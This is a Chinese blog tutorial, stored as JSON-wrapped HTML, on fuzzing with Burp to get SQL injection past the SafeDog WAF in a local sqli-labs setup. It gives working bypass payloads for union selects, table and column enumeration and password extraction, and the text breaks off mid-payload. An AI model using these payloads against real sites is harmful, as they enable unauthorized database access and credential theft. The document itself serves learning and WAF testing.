{"title":"从SQL注入绕过最新安全狗WAF中学习fuzz","uid":"c4af92d3966b8512b6eb5994e52b620f","slug":"从SQL注入绕过最新安全狗WAF中学习fuzz","date":"2022-06-08T09:35:30.000Z","updated":"2024-02-14T07:42:42.000Z","comments":true,"path":"api/articles/从SQL注入绕过最新安全狗WAF中学习fuzz.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141515509.png","content":"<h1 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h1><p>文章首发于先知社区<a href=\"https://xz.aliyun.com/t/11412\">https://xz.aliyun.com/t/11412</a></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>SQL注入并不是很精通，通过实战绕过WAF来进行加强SQL注入能力，希望对正在学习的师傅能有一丝帮助。</p>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><h2 id=\"安装前言\"><a href=\"#安装前言\" class=\"headerlink\" title=\"安装前言\"></a>安装前言</h2><p>我是本地搭建的环境进行测试的<br>环境是<code>windows11+phpstudy2018+sqli-labs</code><br>phpstudy的安装我不再复述，这里简单说一下安全狗插件和安全狗的安装。</p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p>在安装安全狗之前，一定要先做好安装<code>apache2.4</code>这一项，否则可能要浪费半个下午的时间来整(受害者本人自述了属于是)，因为在提前安装好这个后，再安装安全狗，就会出现如下图所示的情况，这时候就很容易进行配置了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151090.png\" alt=\"在这里插入图片描述\"><br>而如果你后安装apache2.4，出现Apache插件安装失败的可能性极大，那我们要怎么安装apache2.4呢，很简单，首先找到你apache下的bin路径，我的是<code>&quot;D:\\phpStudy\\PHPTutorial\\Apache\\bin&quot;</code>，然后进入cmd中(以管理员身份运行)</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">C</span><span class=\"token punctuation\">:</span>\\Windows\\system32<span class=\"token operator\">></span>d<span class=\"token punctuation\">:</span>\n\n<span class=\"token constant\">D</span><span class=\"token punctuation\">:</span>\\<span class=\"token operator\">></span>cd <span class=\"token constant\">D</span><span class=\"token punctuation\">:</span>\\phpStudy\\PHPTutorial\\Apache\\bin\n\n<span class=\"token constant\">D</span><span class=\"token punctuation\">:</span>\\phpStudy\\PHPTutorial\\Apache\\bin<span class=\"token operator\">></span> httpd <span class=\"token operator\">-</span>k install <span class=\"token operator\">-</span>n apache2<span class=\"token operator\">.</span><span class=\"token number\">4</span>\n<span class=\"token comment\">//安装插件</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时插件的安装就完成了，直接去官网找Apache版本的安全狗<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151096.png\" alt=\"在这里插入图片描述\"><br>下载到本地即可，此时进行安装(不要开启phpstudy)，此时选择好安装路径后就会出现配置界面，它安装过插件的话一般是会自动检测的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151102.png\" alt=\"在这里插入图片描述\"><br>此时直接点击确定就好了，然后打开就会发现插件是已安装的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151072.png\" alt=\"在这里插入图片描述\"><br>此时看安全狗这个网站安全狗与防护总开关是否都开启，只有都开启了才有效，此时再去打开phpstudy，一般他就应该是自己变成系统服务了，如果没变的话就再选择一下即可</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151080.png\" alt=\"在这里插入图片描述\"><br>然后此时的话这个防护网站变成1个就说明配置好了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151085.png\" alt=\"在这里插入图片描述\"><br>去访问网站就可以发现安全狗生效了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151523.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"构造1-1\"><a href=\"#构造1-1\" class=\"headerlink\" title=\"构造1=1\"></a>构造1=1</h1><h2 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2><p>首先这里的话是尝试一个1=1，发现是不可以的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141800424.png\" alt=\"在这里插入图片描述\"><br>更换成true=true进行尝试<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151509.png\" alt=\"在这里插入图片描述\"><br>仍然不行，此时发现当and和后面没有空格的时候就会报错<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151586.png\" alt=\"在这里插入图片描述\"><br>我们这里尝试用/**/来充当注释符<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151573.png\" alt=\"在这里插入图片描述\"><br>发现还是被过滤了，此时我们就利用bp来进行fuzz，抓包后在/**/中添加变量（为爆破做准备）<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151607.png\" alt=\"在这里插入图片描述\"><br>选择暴力破解，字符集就选<code>/!*</code>进行测试即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151988.png\" alt=\"在这里插入图片描述\"><br>得到结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151134.png\" alt=\"在这里插入图片描述\"><br>发现很多都可以充当空格来进行绕过，我们随意挑选一个进行尝试，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token number\">1</span>' <span class=\"token keyword\">and</span><span class=\"token comment\">/*////*/</span><span class=\"token number\">1</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151072.png\" alt=\"在这里插入图片描述\"><br>成功绕过</p>\n<h2 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2><p>当然常见的还有一个内联注释符，就是<code>/*!00000*/</code>这种的，用实例来解释是最好理解的</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> select @@version<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> @@<span class=\"token class-name\">version</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">5.5</span><span class=\"token number\">.53</span>    <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\nmysql<span class=\"token operator\">></span> select <span class=\"token comment\">/*!999991*/</span><span class=\"token punctuation\">;</span>\n<span class=\"token constant\">ERROR</span> <span class=\"token number\">1064</span> <span class=\"token punctuation\">(</span><span class=\"token number\">42000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token class-name return-type\">You</span> have an error in your <span class=\"token constant\">SQL</span> syntax<span class=\"token punctuation\">;</span> check the manual that corresponds to your MySQL server version <span class=\"token keyword\">for</span> the right syntax to <span class=\"token keyword\">use</span> <span class=\"token package\">near</span> <span class=\"token string single-quoted-string\">''</span> at line <span class=\"token number\">1</span>\n\nmysql<span class=\"token operator\">></span> select <span class=\"token comment\">/*!000001*/</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\nmysql<span class=\"token operator\">></span> select <span class=\"token comment\">/*!1*/</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\nmysql<span class=\"token operator\">></span> select <span class=\"token comment\">/*!505531*/</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\nmysql<span class=\"token operator\">></span> select <span class=\"token comment\">/*!505541*/</span><span class=\"token punctuation\">;</span>\n<span class=\"token constant\">ERROR</span> <span class=\"token number\">1064</span> <span class=\"token punctuation\">(</span><span class=\"token number\">42000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token class-name return-type\">You</span> have an error in your <span class=\"token constant\">SQL</span> syntax<span class=\"token punctuation\">;</span> check the manual that corresponds to your MySQL server version <span class=\"token keyword\">for</span> the right syntax to <span class=\"token keyword\">use</span> <span class=\"token package\">near</span> <span class=\"token string single-quoted-string\">''</span> at line <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这种注释在mysql中叫做内联注释，如果没有接版本号时，会直接执行里面内容。当!后面接数据库版本号时，如果自身版本号(上述例子中的5.5.53)大于等于字符数(例如上述例子中的99999和00000)，就会将注释中的内容执行，否则就会当做注释来处理。<br>那么这里的话，我们就想构造1=1，就可以利用它来进行绕过，我们构造如下<code>/*!000001*/=/*!000001*/</code>语句尝试进行绕过<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151103.png\" alt=\"在这里插入图片描述\"><br>可以发现成功绕过了</p>\n<h1 id=\"order-by-绕过\"><a href=\"#order-by-绕过\" class=\"headerlink\" title=\"order by 绕过\"></a>order by 绕过</h1><p>直接利用的话可以发现是不可以的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151119.png\" alt=\"在这里插入图片描述\"><br>由1=1的构造思路，我们尝试构造空格来进行绕过，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token number\">1</span>' order<span class=\"token comment\">/*////*/</span>by <span class=\"token number\">3</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151404.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token number\">1</span>' order<span class=\"token comment\">/*////*/</span>by <span class=\"token number\">4</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151555.png\" alt=\"在这里插入图片描述\"><br>成功判断出来了字段数为3</p>\n<h1 id=\"联合查询\"><a href=\"#联合查询\" class=\"headerlink\" title=\"联合查询\"></a>联合查询</h1><p>首先的话是想利用内联注释来进行一个绕过，因为单独的一个union和单独的select都是可以的，此时我就想利用它内联注释字符数大于版本号时将其内语句作为注释来进行一个绕过，<br>测试过程如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151573.png\" alt=\"在这里插入图片描述\"><br>选择暴力破解，设置0-9依次进行爆破<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151601.png\" alt=\"在这里插入图片描述\"><br>而后得到结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151635.png\" alt=\"在这里插入图片描述\"><br>发现这种利用垃圾字符的内联注释方式无法再次绕过，此时我们去尝试进行其他方法，想到之前的fuzz/**/中间加东西可以绕过，不妨试一下这种，设置如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151897.png\" alt=\"在这里插入图片描述\"><br>选择暴力破解，将字符集进行更换即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151974.png\" alt=\"在这里插入图片描述\"><br>得到结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151025.png\" alt=\"在这里插入图片描述\"><br>发现有很多可以绕过的，随便选一个来进行测试，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' union<span class=\"token comment\">/*/!*!**/</span>select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151065.png\" alt=\"在这里插入图片描述\"><br>可以发现正常执行了，说明绕过了，这里再给出几个payload，师傅们可以自行测试</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' union/*//--**/select 1,2,3--+\nid=-1'</span> union<span class=\"token comment\">/*/!--**/</span>select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\nid<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' union<span class=\"token comment\">/*/-*!!*/</span>select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"爆库\"><a href=\"#爆库\" class=\"headerlink\" title=\"爆库\"></a>爆库</h1><h2 id=\"方法一-方法\"><a href=\"#方法一-方法\" class=\"headerlink\" title=\"方法一(/**/方法)\"></a>方法一(/**/方法)</h2><p>此时直接去将3变成database()会被绕过，此时我是想用<code>/*xxx*/()</code>这种方式来进行绕过，利用bp设置如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151084.png\" alt=\"在这里插入图片描述\"><br>而后如下设置暴力破解<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151254.png\" alt=\"在这里插入图片描述\"><br>得到结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151410.png\" alt=\"在这里插入图片描述\"><br>可以发现有很多方式，我们随便挑选一个进行测试</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' union<span class=\"token comment\">/*/!*!**/</span>select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>database<span class=\"token comment\">/*///-*/</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151494.png\" alt=\"在这里插入图片描述\"><br>成功绕过</p>\n<h2 id=\"方法二-内联注释法\"><a href=\"#方法二-内联注释法\" class=\"headerlink\" title=\"方法二(/*!*/内联注释法)\"></a>方法二(<code>/*!*/</code>内联注释法)</h2><p>我们设置payload为<code>/*!()*/</code>这种，利用bp在括号前面加上五个数字，依次来检验哪个可以进行绕过，具体设置如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141800131.png\" alt=\"在这里插入图片描述\"><br>而后选暴力破解，设置如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151561.png\" alt=\"在这里插入图片描述\"><br>得到结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141801971.png\" alt=\"在这里插入图片描述\"><br>随机取出一个进行测试，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' union<span class=\"token comment\">/*/!*!**/</span>select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>database<span class=\"token comment\">/*!20553()*/</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151870.png\" alt=\"在这里插入图片描述\"><br>成功绕过</p>\n<h1 id=\"爆表\"><a href=\"#爆表\" class=\"headerlink\" title=\"爆表\"></a>爆表</h1><p>正常的话语句一般是这个样子</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema<span class=\"token operator\">.</span>tables where table_schema<span class=\"token operator\">=</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>那么这里的话我们测试过后就会发现information_schema被过滤了，它俩只要在一起挨着就会被过滤<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151941.png\" alt=\"在这里插入图片描述\"><br>同时呢，我们也发现利用from的时候也会被过滤<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151932.png\" alt=\"在这里插入图片描述\"><br>对这两个进行分别fuzz的话比较麻烦，而且将两者进行一起用时可能会出现仍然被过滤的情况，因此此时的话就自然的想到了内联注释这种方法，可不可以用这种方法来进行绕过呢，我们先尝试一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">from<span class=\"token comment\">/*!information_schema.tables*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151283.png\" alt=\"在这里插入图片描述\"><br>显然这种是不可行的，但是我们知道还有一种的话就是内联注释的利用方法就是中间加注释符再加换行，也就是<code>/*!%23%0a*/</code>这种形式，我们先进行本地测试</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> select <span class=\"token comment\">/*!#\n    -> 1*/</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\nmysql<span class=\"token operator\">></span> select <span class=\"token comment\">/*!#/*\n    -> 1*/</span>\n    <span class=\"token operator\">-></span> <span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时经过本地测试发现，当运用内联注释时，里面插入/*，来构造<code>/**/</code>，也是可以实现绕过的，此时我们先试本地测试的第一种方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' union/*/!*!**/select%201,2,group_concat(table_name)from/*!%23%0ainformation_schema.tables*/ where table_schema='</span>security'<span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151324.png\" alt=\"在这里插入图片描述\"><br>此时被绕过，那我们就用刚刚测试出来的第二种方法进行尝试</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' union/*/!*!**/select%201,2,group_concat(table_name)from/*!%23/*%0ainformation_schema.tables*/ where table_schema='</span>security'<span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151362.png\" alt=\"在这里插入图片描述\"><br>此时想有没有可能是过滤了%23,我们将%23换成<code>--+</code><br>构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' union/*/!*!**/select%201,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables*/ where table_schema='</span>security'<span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151728.png\" alt=\"在这里插入图片描述\"><br>得到了全部表</p>\n<h1 id=\"爆列\"><a href=\"#爆列\" class=\"headerlink\" title=\"爆列\"></a>爆列</h1><p>有了表名的注入，那么注入列名也不是件太难的事情，修改一下语句即可，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' union/*/!*!**/select%201,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns*/ where table_name='</span>users'<span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h1 id=\"爆字段信息\"><a href=\"#爆字段信息\" class=\"headerlink\" title=\"爆字段信息\"></a>爆字段信息</h1><p>同理，修改语句即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' union<span class=\"token comment\">/*/!*!**/</span>select<span class=\"token operator\">%</span><span class=\"token number\">201</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span>from<span class=\"token comment\">/*!--+/*%0ausers*/</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h1 id=\"其他姿势\"><a href=\"#其他姿势\" class=\"headerlink\" title=\"其他姿势\"></a>其他姿势</h1><h2 id=\"like-“-23”\"><a href=\"#like-“-23”\" class=\"headerlink\" title=\"like[“%23”]\"></a>like[“%23”]</h2><p>在学习其他师傅的文章时，偶然间发现这个<code>like[&quot;%23&quot;]</code>，这个的话我们知道%23是注释符的含义，那么在这里的时候，它这个语句到底有什么作用呢，我们测试一下就知道了<br>首先先正常查一个字段信息</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token operator\">*</span> from users where id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151722.png\" alt=\"在这里插入图片描述\"><br>此时可以发现有一个结果，我们加上我们的<code>like[&quot;%23&quot;]</code>，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token operator\">*</span> from users where id<span class=\"token operator\">=</span><span class=\"token number\">1</span> like <span class=\"token string double-quoted-string\">\"[%23]\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151744.png\" alt=\"在这里插入图片描述\"><br>此时表变成空的了，那我们如果此时这样构造payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token operator\">*</span> from users where id<span class=\"token operator\">=</span><span class=\"token number\">1</span> like <span class=\"token string double-quoted-string\">\"[%23]\"</span> union select <span class=\"token operator\">*</span> from users<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>我们知道前面<code>users where id=1 like &quot;[%23]&quot;</code>这个是空，那它这条语句就相当于</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token operator\">*</span> from users<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>如下图所示<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151953.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151032.png\" alt=\"在这里插入图片描述\"><br>那么此时我们就可以去我们的靶场进行测试，看是否能绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' like <span class=\"token string double-quoted-string\">\"[%23]\"</span> <span class=\"token comment\">/*!10440union select*/</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token 